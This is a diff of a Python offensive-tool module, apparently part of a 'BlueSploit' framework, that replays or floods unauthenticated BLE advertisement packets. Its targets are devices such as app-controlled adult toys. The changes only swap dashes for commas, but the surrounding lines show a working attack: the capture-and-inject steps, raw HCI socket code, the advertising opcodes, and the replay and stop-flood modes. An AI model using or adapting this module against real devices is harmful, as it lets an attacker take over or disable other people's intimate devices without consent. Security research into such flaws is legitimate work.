@@ -2,7 +2,7 @@
 BlueSploit Module: Denial of Pleasure
 
 Replay attack against BLE devices controlled via unauthenticated
-advertisement packets — no pairing required, no authentication, pure
+advertisement packets, no pairing required, no authentication, pure
 broadcast injection over HCI LE advertising commands.
 
 Discovered by Mando Mat (2023) targeting Love Spouse app adult toys, but
@@ -13,23 +13,23 @@ Attack flow:
   1. Capture a BLE advertisement control packet with nRF Connect / Wireshark
      (filter: LE_META → LE Advertising Report → data field)
   2. Copy the raw advertising payload hex (max 31 bytes)
-  3. Feed it to this module — it injects the payload via HCI LE Set
+  3. Feed it to this module, it injects the payload via HCI LE Set
      Advertising Data + LE Set Advertise Enable
   4. Device receives the spoofed broadcast and executes the command
      (stop vibration = DoS, or replay start = activation)
 
 Modes:
-  replay  — continuously broadcast a captured advertisement payload
-  stop    — broadcast an all-stop payload (0 intensity) for known protocols
-  scan    — passive scan to capture target advertisements for 30s
-  check   — verify HCI adapter supports LE advertising
+  replay , continuously broadcast a captured advertisement payload
+  stop   , broadcast an all-stop payload (0 intensity) for known protocols
+  scan   , passive scan to capture target advertisements for 30s
+  check  , verify HCI adapter supports LE advertising
 
 The HCI path (raw socket / hcitool cmd) is the exact mechanism used:
   OGF=0x08 OCF=0x0006  LE_Set_Advertising_Parameters
   OGF=0x08 OCF=0x0008  LE_Set_Advertising_Data
   OGF=0x08 OCF=0x000A  LE_Set_Advertise_Enable
 
-No third-party BLE library required — only BlueZ + hciconfig + hcitool.
+No third-party BLE library required, only BlueZ + hciconfig + hcitool.
 
 References:
   https://mandomat.github.io/2023-11-13-denial-of-pleasure/
@@ -99,7 +99,7 @@ class HCI:
         s = socket.socket(AF_BLUETOOTH, socket.SOCK_RAW, BTPROTO_HCI)
         s.bind((self.dev_id,))
         # struct hci_filter: type_mask(4) + event_mask[0](4) + event_mask[1](4) + opcode(2) = 14 bytes
-        # MUST be exactly 14 — kernel silently ignores wrong sizes.
+        # MUST be exactly 14, kernel silently ignores wrong sizes.
         flt = struct.pack("<IIIH",
                           (1 << HCI_EVENT_PKT),  # only care about events
                           0xFFFFFFFF,             # all event bits [0]
@@ -163,7 +163,7 @@ class HCI:
         return self.cmd(_opcode(OGF_LE, OCF_LE_SET_ADV_PARAMS), params)
 
     def le_set_adv_data(self, data: bytes) -> bool:
-        """Set advertising data — data max 31 bytes, padded to exactly 31."""
+        """Set advertising data, data max 31 bytes, padded to exactly 31."""
         if len(data) > 31:
             raise ValueError("Advertising data max 31 bytes")
         padded = data + b"\x00" * (31 - len(data))
@@ -350,7 +350,7 @@ class Module(DosModule):
         else:
             print_success(f"{iface} found")
             if "DOWN" in out:
-                print_warning(f"{iface} is DOWN — run: hciconfig {iface} up")
+                print_warning(f"{iface} is DOWN, run: hciconfig {iface} up")
 
         print_info("[2/3] Raw HCI socket openable?")
         try:
@@ -372,21 +372,21 @@ class Module(DosModule):
             if r:
                 print_success("LE advertising supported on this adapter")
             else:
-                print_warning("LE Set Adv Params returned non-zero status — "
+                print_warning("LE Set Adv Params returned non-zero status, "
                               "adapter may not support LE or is busy")
                 ok = False
         except OSError as e:
             print_error(f"HCI command failed: {e}"); ok = False
 
         if ok:
-            print_success("\nReady — set mode=replay and supply payload_hex")
+            print_success("\nReady, set mode=replay and supply payload_hex")
         return ok
 
     # ── scan ─────────────────────────────────────────────────────────────────
 
     def _do_scan(self, dev_id: int, duration: int,
                  filter_addr: Optional[str]) -> bool:
-        print_info(f"\nPassive LE scan for {duration}s — capture control packets")
+        print_info(f"\nPassive LE scan for {duration}s, capture control packets")
         print_info("Tip: look for repeated short payloads from the same address")
         if filter_addr:
             print_info(f"Filtering to: {filter_addr.upper()}")
@@ -463,21 +463,21 @@ class Module(DosModule):
 
             if not h.le_set_adv_params(
                 min_interval=iv_units, max_interval=iv_units,
-                adv_type=0x03,          # ADV_NONCONN_IND — no connection req
+                adv_type=0x03,          # ADV_NONCONN_IND, no connection req
                 own_addr_type=0x00,
                 channel_map=0x07,
             ):
-                print_warning("LE Set Adv Params returned error — continuing anyway")
+                print_warning("LE Set Adv Params returned error, continuing anyway")
 
             if not h.le_set_adv_data(payload):
-                print_error("LE Set Adv Data failed — adapter may not support LE")
+                print_error("LE Set Adv Data failed, adapter may not support LE")
                 return False
             print_success("Advertising data set")
 
             if not h.le_adv_enable(True):
                 print_error("LE Set Advertise Enable failed")
                 return False
-            print_success(f"Advertising started — broadcasting for {duration}s (Ctrl+C to stop)")
+            print_success(f"Advertising started, broadcasting for {duration}s (Ctrl+C to stop)")
 
             deadline = time.time() + duration
             tx = 0
@@ -493,7 +493,7 @@ class Module(DosModule):
 
             print()
             h.le_adv_enable(False)
-            print_success(f"Done — approximately {tx} advertisements sent")
+            print_success(f"Done, approximately {tx} advertisements sent")
             ok = True
             self.add_result({
                 "mode": "replay",
@@ -514,7 +514,7 @@ class Module(DosModule):
 
     def _do_stop_flood(self, dev_id: int, duration: int, interval_ms: int) -> bool:
         """
-        Broadcast a generic BLE 'stop' pattern — 0x00 intensity / all zeros.
+        Broadcast a generic BLE 'stop' pattern, 0x00 intensity / all zeros.
         For devices that use length-prefixed type-value payloads, zero payload
         often maps to 'stop all motors'.  Adjust payload_hex if needed.
         """
